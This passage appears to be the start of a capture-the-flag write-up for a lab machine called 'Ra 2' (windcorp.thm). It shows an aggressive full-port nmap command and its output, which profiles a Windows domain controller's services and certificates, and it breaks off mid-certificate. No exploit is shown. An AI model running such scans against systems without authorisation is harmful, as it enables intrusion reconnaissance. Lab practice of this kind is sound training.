> Ra 2

# Nmap

nmap -sC -sV -T4 -Pn -A -vv -p- $IP

```
53/tcp    open  domain              syn-ack Simple DNS Plus
80/tcp    open  http                syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to https://fire.windcorp.thm/
88/tcp    open  kerberos-sec        syn-ack Microsoft Windows Kerberos (server time: 2021-05-09 14:36:18Z)
135/tcp   open  msrpc               syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn         syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap                syn-ack Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-29T03:31:08
| Not valid after:  2028-05-29T03:41:03
| MD5:   804b dc39 5ce5 dd7b 19a5 851c 01d1 23ad
| SHA-1: 37f4 e667 cef7 5cc4 47c9 d201 25cf 2b7d 20b2 c1f4
| -----BEGIN CERTIFICATE-----
| MIIDajCCAlKgAwIBAgIQUI2QvXTCj7RCVdv6XlGMvjANBgkqhkiG9w0BAQsFADAc
| MRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTAeFw0yMDA1MjkwMzMxMDhaFw0y
| ODA1MjkwMzQxMDNaMBwxGjAYBgNVBAMMEWZpcmUud2luZGNvcnAudGhtMIIBIjAN
| BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAv900af0f6n80F0J6U9jMgcwQrozr
| kXmi02esW1XAsHpWnuuMQDIN6AtiYmDcoFEXz/NteLI7T6PusqQ6SXqLBurTnR8V
| InPD3Qea6lxOXNjuNeqqZKHhUaXiwSaqtAB+GzPkNtevw3jeEj99ST/G1qwY9Xce
| sfeqR2J4kQ+8U5yKLJDPBxOSx3+SHjKErrLTk66lrlEi4atr+P/ccXA5TBkZFkYh
| i3YdKTDnYeP2fMrqvOqpw82eniHAGJ2N8JJbNep86ps8giIRieBUUclF/WCp4c33
| p4i1ioVxJIYJj6f0tjGhy9GxB7l69OtUutcIG0/FhxL2dQ86MmnHH0dE7QIDAQAB
| o4GnMIGkMA4GA1UdDwEB/wQEAwIFoDAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYB
| BQUHAwEwVAYDVR0RBE0wS4IRZmlyZS53aW5kY29ycC50aG2CGHNlbGZzZXJ2aWNl
| LndpbmRjb3JwLnRobYIcc2VsZnNlcnZpY2UuZGV2LndpbmRjb3JwLnRobTAdBgNV
| HQ4EFgQUIZvYlCIhAOFLRutycf6U2H6LhqIwDQYJKoZIhvcNAQELBQADggEBAKVC
| ZS6HOuSODERi/glj3rPJaHCStxHPEg69txOIDaM9fX4WBfmSjn+EzlrHLdeRS22h
| nTPirvuT+5nn6xbUrq9J6RCTZJD+uFc9wZl7Viw3hJcWbsO8DTQAshuZ5YJ574pG
| HjyoVDOfYhy8/8ThvYf1H8/OaIpG4UIo0vY9qeBQBOPZdbdVjWNerkFmXVq+MMVf
| pAt+FffQE/48kTCppuSKeM5ZMgHP1/zhZqyJ3npljVDlgppjvh1loSYB+reMkhwK
| 2gpGJNwxLyFDhTMLaj0pzFL9okqs5ovEWEj8p96hEE6Xxl4ZApv6mxTs9j2oY6+P
| MTUqFyYKchFUeYlgf7k=
|_-----END CERTIFICATE-----
|_ssl-date: 2021-05-09T14:37:57+00:00; +1s from scanner time.
443/tcp   open  ssl/http            syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-29T03:31:08
| Not valid after:  2028-05-29T03:41:03
| MD5:   804b dc39 5ce5 dd7b 19a5 851c 01d1 23ad
| SHA-1: 37f4 e667 cef7 5cc4 47c9 d201 25cf 2b7d 20b2 c1f4
| -----BEGIN CERTIFICATE-----
| MIIDajCCAlKgAwIBAgIQUI2QvXTCj7RCVdv6XlGMvjANBgkqhkiG9w0BAQsFADAc
| MRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTAeFw0yMDA1MjkwMzMxMDhaFw0y
| ODA1MjkwMzQxMDNaMBwxGjAYBgNVBAMMEWZpcmUud2luZGNvcnAudGhtMIIBIjAN
| BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAv900af0f6n80F0J6U9jMgcwQrozr
| kXmi02esW1XAsHpWnuuMQDIN6AtiYmDcoFEXz/NteLI7T6PusqQ6SXqLBurTnR8V
| InPD3Qea6lxOXNjuNeqqZKHhUaXiwSaqtAB+GzPkNtevw3jeEj99ST/G1qwY9Xce
| sfeqR2J4kQ+8U5yKLJDPBxOSx3+SHjKErrLTk66lrlEi4atr+P/ccXA5TBkZFkYh
| i3YdKTDnYeP2fMrqvOqpw82eniHAGJ2N8JJbNep86ps8giIRieBUUclF/WCp4c33
| p4i1ioVxJIYJj6f0tjGhy9GxB7l69OtUutcIG0/FhxL2dQ86MmnHH0dE7QIDAQAB
| o4GnMIGkMA4GA1UdDwEB/wQEAwIFoDAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYB
| BQUHAwEwVAYDVR0RBE0wS4IRZmlyZS53aW5kY29ycC50aG2CGHNlbGZzZXJ2aWNl
| LndpbmRjb3JwLnRobYIcc2VsZnNlcnZpY2UuZGV2LndpbmRjb3JwLnRobTAdBgNV
| HQ4EFgQUIZvYlCIhAOFLRutycf6U2H6LhqIwDQYJKoZIhvcNAQELBQADggEBAKVC
| ZS6HOuSODERi/glj3rPJaHCStxHPEg69txOIDaM9fX4WBfmSjn+EzlrHLdeRS22h
| nTPirvuT+5nn6xbUrq9J6RCTZJD+uFc9wZl7Viw3hJcWbsO8DTQAshuZ5YJ574pG
| HjyoVDOfYhy8/8ThvYf1H8/OaIpG4UIo0vY9qeBQBOPZdbdVjWNerkFmXVq+MMVf
| pAt+FffQE/48kTCppuSKeM5ZMgHP1/zhZqyJ3npljVDlgppjvh1loSYB+reMkhwK
| 2gpGJNwxLyFDhTMLaj0pzFL9okqs5ovEWEj8p96hEE6Xxl4ZApv6mxTs9j2oY6+P
| MTUqFyYKchFUeYlgf7k=
|_-----END CERTIFICATE-----
|_ssl-date: 2021-05-09T14:37:56+00:00; +1s from scanner time.
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?       syn-ack
464/tcp   open  kpasswd5?           syn-ack
593/tcp   open  ncacn_http          syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap            syn-ack Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-29T03:31:08
| Not valid after:  2028-05-29T03:41:03
| MD5:   804b dc39 5ce5 dd7b 19a5 851c 01d1 23ad
| SHA-1: 37f4 e667 cef7 5cc4 47c9 d201 25cf 2b7d 20b2 c1f4
| -----BEGIN CERTIFICATE-----
| MIIDajCCAlKgAwIBAgIQUI2QvXTCj7RCVdv6XlGMvjANBgkqhkiG9w0BAQsFADAc
| MRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTAeFw0yMDA1MjkwMzMxMDhaFw0y
| ODA1MjkwMzQxMDNaMBwxGjAYBgNVBAMMEWZpcmUud2luZGNvcnAudGhtMIIBIjAN
| BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAv900af0f6n80F0J6U9jMgcwQrozr
| kXmi02esW1XAsHpWnuuMQDIN6AtiYmDcoFEXz/NteLI7T6PusqQ6SXqLBurTnR8V
| InPD3Qea6lxOXNjuNeqqZKHhUaXiwSaqtAB+GzPkNtevw3jeEj99ST/G1qwY9Xce
| sfeqR2J4kQ+8U5yKLJDPBxOSx3+SHjKErrLTk66lrlEi4atr+P/ccXA5TBkZFkYh
| i3YdKTDnYeP2fMrqvOqpw82eniHAGJ2N8JJbNep86ps8giIRieBUUclF/WCp4c33
| p4i1ioVxJIYJj6f0tjGhy9GxB7l69OtUutcIG0/FhxL2dQ86MmnHH0dE7QIDAQAB
| o4GnMIGkMA4GA1UdDwEB/wQEAwIFoDAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYB
| BQUHAwEwVAYDVR0RBE0wS4IRZmlyZS53aW5kY29ycC50aG2CGHNlbGZzZXJ2aWNl
| LndpbmRjb3JwLnRobYIcc2VsZnNlcnZpY2UuZGV2LndpbmRjb3JwLnRobTAdBgNV
| HQ4EFgQUIZvYlCIhAOFLRutycf6U2H6LhqIwDQYJKoZIhvcNAQELBQADggEBAKVC
| ZS6HOuSODERi/glj3rPJaHCStxHPEg69txOIDaM9fX4WBfmSjn+EzlrHLdeRS22h
| nTPirvuT+5nn6xbUrq9J6RCTZJD+uFc9wZl7Viw3hJcWbsO8DTQAshuZ5YJ574pG
| HjyoVDOfYhy8/8ThvYf1H8/OaIpG4UIo0vY9qeBQBOPZdbdVjWNerkFmXVq+MMVf
| pAt+FffQE/48kTCppuSKeM5ZMgHP1/zhZqyJ3npljVDlgppjvh1loSYB+reMkhwK
| 2gpGJNwxLyFDhTMLaj0pzFL9okqs5ovEWEj8p96hEE6Xxl4ZApv6mxTs9j2oY6+P
| MTUqFyYKchFUeYlgf7k=
|_-----END CERTIFICATE-----
|_ssl-date: 2021-05-09T14:37:56+00:00; +1s from scanner time.
2179/tcp  open  vmrdp?              syn-ack
3268/tcp  open  ldap                syn-ack Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-29T03:31:08
| Not valid after:  2028-05-29T03:41:03
| MD5:   804b dc39 5ce5 dd7b 19a5 851c 01d1 23ad
| SHA-1: 37f4 e667 cef7 5cc4 47c9 d201 25cf 2b7d 20b2 c1f4
| -----BEGIN CERTIFICATE-----
| MIIDajCCAlKgAwIBAgIQUI2QvXTCj7RCVdv6XlGMvjANBgkqhkiG9w0BAQsFADAc
| MRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTAeFw0yMDA1MjkwMzMxMDhaFw0y
| ODA1MjkwMzQxMDNaMBwxGjAYBgNVBAMMEWZpcmUud2luZGNvcnAudGhtMIIBIjAN
| BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAv900af0f6n80F0J6U9jMgcwQrozr
| kXmi02esW1XAsHpWnuuMQDIN6AtiYmDcoFEXz/NteLI7T6PusqQ6SXqLBurTnR8V
| InPD3Qea6lxOXNjuNeqqZKHhUaXiwSaqtAB+GzPkNtevw3jeEj99ST/G1qwY9Xce
| sfeqR2J4kQ+8U5yKLJDPBxOSx3+SHjKErrLTk66lrlEi4atr+P/ccXA5TBkZFkYh
| i3YdKTDnYeP2fMrqvOqpw82eniHAGJ2N8JJbNep86ps8giIRieBUUclF/WCp4c33
| p4i1ioVxJIYJj6f0tjGhy9GxB7l69OtUutcIG0/FhxL2dQ86MmnHH0dE7QIDAQAB
| o4GnMIGkMA4GA1UdDwEB/wQEAwIFoDAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYB
| BQUHAwEwVAYDVR0RBE0wS4IRZmlyZS53aW5kY29ycC50aG2CGHNlbGZzZXJ2aWNl
| LndpbmRjb3JwLnRobYIcc2VsZnNlcnZpY2UuZGV2LndpbmRjb3JwLnRobTAdBgNV
| HQ4EFgQUIZvYlCIhAOFLRutycf6U2H6LhqIwDQYJKoZIhvcNAQELBQADggEBAKVC
| ZS6HOuSODERi/glj3rPJaHCStxHPEg69txOIDaM9fX4WBfmSjn+EzlrHLdeRS22h
| nTPirvuT+5nn6xbUrq9J6RCTZJD+uFc9wZl7Viw3hJcWbsO8DTQAshuZ5YJ574pG
| HjyoVDOfYhy8/8ThvYf1H8/OaIpG4UIo0vY9qeBQBOPZdbdVjWNerkFmXVq+MMVf
| pAt+FffQE/48kTCppuSKeM5ZMgHP1/zhZqyJ3npljVDlgppjvh1loSYB+reMkhwK
| 2gpGJNwxLyFDhTMLaj0pzFL9okqs5ovEWEj8p96hEE6Xxl4ZApv6mxTs9j2oY6+P
| MTUqFyYKchFUeYlgf7k=
|_-----END CERTIFICATE-----
|_ssl-date: 2021-05-09T14:37:58+00:00; +1s from scanner time.
3269/tcp  open  ssl/ldap            syn-ack Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-29T03:31:08
| Not valid after:  2028-05-29T03:41:03
| MD5:   804b dc39 5ce5 dd7b 19a5 851c 01d1 23ad
| SHA-1: 37f4 e667 cef7 5cc4 47c9 d201 25cf 2b7d 20b2 c1f4
| -----BEGIN CERTIFICATE-----
| MIIDajCCAlKgAwIBAgIQUI2QvXTCj7RCVdv6XlGMvjANBgkqhkiG9w0BAQsFADAc
| MRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTAeFw0yMDA1MjkwMzMxMDhaFw0y
| ODA1MjkwMzQxMDNaMBwxGjAYBgNVBAMMEWZpcmUud2luZGNvcnAudGhtMIIBIjAN
| BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAv900af0f6n80F0J6U9jMgcwQrozr
| kXmi02esW1XAsHpWnuuMQDIN6AtiYmDcoFEXz/NteLI7T6PusqQ6SXqLBurTnR8V
| InPD3Qea6lxOXNjuNeqqZKHhUaXiwSaqtAB+GzPkNtevw3jeEj99ST/G1qwY9Xce
| sfeqR2J4kQ+8U5yKLJDPBxOSx3+SHjKErrLTk66lrlEi4atr+P/ccXA5TBkZFkYh
| i3YdKTDnYeP2fMrqvOqpw82eniHAGJ2N8JJbNep86ps8giIRieBUUclF/WCp4c33
| p4i1ioVxJIYJj6f0tjGhy9GxB7l69OtUutcIG0/FhxL2dQ86MmnHH0dE7QIDAQAB
| o4GnMIGkMA4GA1UdDwEB/wQEAwIFoDAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYB
| BQUHAwEwVAYDVR0RBE0wS4IRZmlyZS53aW5kY29ycC50aG2CGHNlbGZzZXJ2aWNl
| LndpbmRjb3JwLnRobYIcc2VsZnNlcnZpY2UuZGV2LndpbmRjb3JwLnRobTAdBgNV
| HQ4EFgQUIZvYlCIhAOFLRutycf6U2H6LhqIwDQYJKoZIhvcNAQELBQADggEBAKVC
| ZS6HOuSODERi/glj3rPJaHCStxHPEg69txOIDaM9fX4WBfmSjn+EzlrHLdeRS22h
| nTPirvuT+5nn6xbUrq9J6RCTZJD+uFc9wZl7Viw3hJcWbsO8DTQAshuZ5YJ574pG
| HjyoVDOfYhy8/8ThvYf1H8/OaIpG4UIo0vY9qeBQBOPZdbdVjWNerkFmXVq+MMVf
| pAt+FffQE/48kTCppuSKeM5ZMgHP1/zhZqyJ3npljVDlgppjvh1loSYB+reMkhwK
| 2gpGJNwxLyFDhTMLaj0pzFL9okqs5ovEWEj8p96hEE6Xxl4ZApv6mxTs9j2oY6+P
| MTUqFyYKchFUeYlgf7k=
|_-----END CERTIFICATE-----
|_ssl-date: 2021-05-09T14:37:57+00:00; +1s from scanner time.
3389/tcp  open  ms-wbt-server       syn-ack Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WINDCORP
|   NetBIOS_Domain_Name: WINDCORP
|   NetBIOS_Computer_Name: FIRE
|   DNS_Domain_Name: windcorp.thm
|   DNS_Computer_Name: Fire.windcorp.thm
|   DNS_Tree_Name: windcorp.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2021-05-09T14:37:16+00:00
| ssl-cert: Subject: commonName=Fire.windcorp.thm
| Issuer: commonName=Fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-05-08T14:24:27
| Not valid after:  2021-11-07T14:24:27
| MD5:   c7cf 6f27 1ef7 322e 48f5 41f2 3a91 c68c
| SHA-1: 9ae1 8bb2 198a ef8e 403d dfbe e624 7314 109b e14d
| -----BEGIN CERTIFICATE-----
| MIIC5jCCAc6gAwIBAgIQFfokZQ5pZKhE2k10kJ2dQjANBgkqhkiG9w0BAQsFADAc
| MRowGAYDVQQDExFGaXJlLndpbmRjb3JwLnRobTAeFw0yMTA1MDgxNDI0MjdaFw0y
| MTExMDcxNDI0MjdaMBwxGjAYBgNVBAMTEUZpcmUud2luZGNvcnAudGhtMIIBIjAN
| BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtj6OEj0iSI8v9d4HS4BrXLkCwkLI
| wOEoAi+tnMZ6o8syymHsIBA0LayENqehQ1oGvdqxacxICCTCQeGXcbxNqVM7vouT
| UcXra7mC79EAMlFnNQDfOoD2Q5XkNvfbDciclEWeJs06RZSTJDCkQJESIUxGetlS
| 0RUTgsZ6PoUhu4FUtpY7AfWsSFo0NxF6zx+SgvSJEsl4Nt0VEQzGmlJkyfDuTrEz
| DN1rIR4iHCyp/ysfaU5O5AtCJzOHGkuCjMDHUIl7ETsW78UxmbEr4ktcW5IJUtTy
| FhAViwHvBRWsYK2vR8Xu1vqBmQ/HVO9f+I+zPbNB+8OuGYBQ1eUp2PIVwQIDAQAB
| oyQwIjATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcN
| AQELBQADggEBAKuw6oWGlT+55C9yRlU0BPbnB7b3O8uY/Ck+BIuzij0zY78ysx0r
| WzURLnhYQErlHnCl1hH7RscJ/1GEU9HeeojQflr1FVbLs+Try7BAOrQSGIZ0R/Fa
| 8XEPor6sge8af1OiSbogq+XPFGR5Y3j7kObYu1LOlEvSAE+7gnHhUFfMj8zR9G8d
| T5qTnvRM/7LEGZELm8+WTRMFUDCS4y2htNjuu7JowAxZYEVhnjcXdV63rso9/j8P
| /pthO7dn85xXLZBtIOck/G05vSIK2Gbx265gg92QKCT09gYsg8pbxVwCwKODqXfw
| sEasOW2Z9EMwGz621nVO99Nccbs6nL1+5fo=
|_-----END CERTIFICATE-----
|_ssl-date: 2021-05-09T14:37:58+00:00; +1s from scanner time.
5222/tcp  open  jabber              syn-ack
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     features: 
| 
|     errors: 
|       invalid-namespace
|       (timeout)
|     xmpp: 
|       version: 1.0
|     auth_mechanisms: 
| 
|     unknown: 
| 
|     capabilities: 
| 
|     compression_methods: 
| 
|_    stream_id: 5dau8qd2xb
5223/tcp  open  ssl/hpvirtgrp?      syn-ack
5229/tcp  open  jaxflow?            syn-ack
5262/tcp  open  jabber              syn-ack
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     features: 
| 
|     errors: 
|       invalid-namespace
|       (timeout)
|     xmpp: 
|       version: 1.0
|     auth_mechanisms: 
| 
|     unknown: 
| 
|     capabilities: 
| 
|     compression_methods: 
| 
|_    stream_id: a9s1nkyro9
5263/tcp  open  ssl/unknown         syn-ack
5269/tcp  open  xmpp                syn-ack Wildfire XMPP Client
| xmpp-info: 
|   Respects server name
|   STARTTLS Failed
|   info: 
|     features: 
| 
|     errors: 
|       host-unknown
|       (timeout)
|     xmpp: 
|       version: 1.0
|     auth_mechanisms: 
| 
|     unknown: 
| 
|     capabilities: 
| 
|     compression_methods: 
| 
|_    stream_id: 3ggu73g043
5270/tcp  open  ssl/xmp?            syn-ack
5275/tcp  open  jabber              syn-ack
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     features: 
| 
|     errors: 
|       invalid-namespace
|       (timeout)
|     xmpp: 
|       version: 1.0
|     auth_mechanisms: 
| 
|     unknown: 
| 
|     capabilities: 
| 
|     compression_methods: 
| 
|_    stream_id: 76uchkm06i
5276/tcp  open  ssl/unknown         syn-ack
7070/tcp  open  http                syn-ack Jetty 9.4.18.v20190429
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Jetty(9.4.18.v20190429)
|_http-title: Openfire HTTP Binding Service
7443/tcp  open  ssl/http            syn-ack Jetty 9.4.18.v20190429
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Jetty(9.4.18.v20190429)
|_http-title: Openfire HTTP Binding Service
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-01T08:39:00
| Not valid after:  2025-04-30T08:39:00
| MD5:   b715 5425 83f3 a20f 75c8 ca2d 3353 cbb7
| SHA-1: 97f7 0772 a26b e324 7ed5 bbcb 5f35 7d74 7982 66ae
| -----BEGIN CERTIFICATE-----
| MIIDLzCCAhegAwIBAgIIXUFELG7QgAIwDQYJKoZIhvcNAQELBQAwHDEaMBgGA1UE
| AwwRZmlyZS53aW5kY29ycC50aG0wHhcNMjAwNTAxMDgzOTAwWhcNMjUwNDMwMDgz
| OTAwWjAcMRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAKLH0/j17RVdD8eXC+0IFovAoql2REjOSf2NpJLK
| /6fgtx3CA4ftLsj7yOpmj8Oe1gqfWd2EM/zKk+ZmZwQFxLQL93t1OD/za1gyclxr
| IVbPVWqFoM2BUU9O3yU0VVRGP7xKDHm4bcoNmq9UNurEtFlCNeCC1fcwzfYvKD89
| X04Rv/6kn1GlQq/iM8PGCLDUf1p1WJcwGT5FUiBa9boTU9llBcGqbodZaBKzPPP8
| DmvSYF71IKBT8NsVzqiAiO3t/oHgApvUd9BqdbZeN46XORrOhBQV0xUpNVy9L5OE
| UAD1so3ePTNjpPE5SfTKymT1a8Fiw5kroKODN0nzy50yP3UCAwEAAaN1MHMwMQYD
| VR0RBCowKIIRZmlyZS53aW5kY29ycC50aG2CEyouZmlyZS53aW5kY29ycC50aG0w
| HQYDVR0OBBYEFOtMzqgfsY11qewZNfPjiLxnGykGMB8GA1UdIwQYMBaAFOtMzqgf
| sY11qewZNfPjiLxnGykGMA0GCSqGSIb3DQEBCwUAA4IBAQAHofv0VP+hE+5sg0KR
| 2x0Xeg4cIXEia0c5cIJ7K7bhfoLOcT7WcMKCLIN3A416PREdkB6Q610uDs8RpezJ
| II/wBoIp2G0Y87X3Xo5FmNJjl9lGX5fvayen98khPXvZkurHdWdtA4m8pHOdYOrk
| n8Jth6L/y4L5WlgEGL0x0HK4yvd3iz0VNrc810HugpyfVWeasChhZjgAYXUVlA8k
| +QxLxyNr/PBfRumQGzw2n3msXxwfHVzaHphy56ph85PcRS35iNqgrtK0fe3Qhpq7
| v5vQYKlOGq5FI6Mf9ni7S1pXSqF4U9wuqZy4q4tXWAVootmJv1DIgfSMLvXplN9T
| LucP
|_-----END CERTIFICATE-----
7777/tcp  open  socks5              syn-ack (No authentication; connection failed)
| socks-auth-info: 
|_  No authentication
9090/tcp  open  zeus-admin?         syn-ack
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Sun, 09 May 2021 14:36:18 GMT
|     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 115
|     <html>
|     <head><title></title>
|     <meta http-equiv="refresh" content="0;URL=index.jsp">
|     </head>
|     <body>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sun, 09 May 2021 14:36:28 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   JavaRMI, drda, ibm-db2-das, informix: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   SqueezeCenter_CLI: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   WMSRequest: 
|     HTTP/1.1 400 Illegal character CNTL=0x1
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x1</pre>
9091/tcp  open  ssl/xmltec-xmlmail? syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Sun, 09 May 2021 14:36:41 GMT
|     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 115
|     <html>
|     <head><title></title>
|     <meta http-equiv="refresh" content="0;URL=index.jsp">
|     </head>
|     <body>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sun, 09 May 2021 14:36:41 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   Help: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 400 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Unknown Version</pre>
|   SSLSessionReq: 
|     HTTP/1.1 400 Illegal character CNTL=0x16
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 70
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-01T08:39:00
| Not valid after:  2025-04-30T08:39:00
| MD5:   b715 5425 83f3 a20f 75c8 ca2d 3353 cbb7
| SHA-1: 97f7 0772 a26b e324 7ed5 bbcb 5f35 7d74 7982 66ae
| -----BEGIN CERTIFICATE-----
| MIIDLzCCAhegAwIBAgIIXUFELG7QgAIwDQYJKoZIhvcNAQELBQAwHDEaMBgGA1UE
| AwwRZmlyZS53aW5kY29ycC50aG0wHhcNMjAwNTAxMDgzOTAwWhcNMjUwNDMwMDgz
| OTAwWjAcMRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAKLH0/j17RVdD8eXC+0IFovAoql2REjOSf2NpJLK
| /6fgtx3CA4ftLsj7yOpmj8Oe1gqfWd2EM/zKk+ZmZwQFxLQL93t1OD/za1gyclxr
| IVbPVWqFoM2BUU9O3yU0VVRGP7xKDHm4bcoNmq9UNurEtFlCNeCC1fcwzfYvKD89
| X04Rv/6kn1GlQq/iM8PGCLDUf1p1WJcwGT5FUiBa9boTU9llBcGqbodZaBKzPPP8
| DmvSYF71IKBT8NsVzqiAiO3t/oHgApvUd9BqdbZeN46XORrOhBQV0xUpNVy9L5OE
| UAD1so3ePTNjpPE5SfTKymT1a8Fiw5kroKODN0nzy50yP3UCAwEAAaN1MHMwMQYD
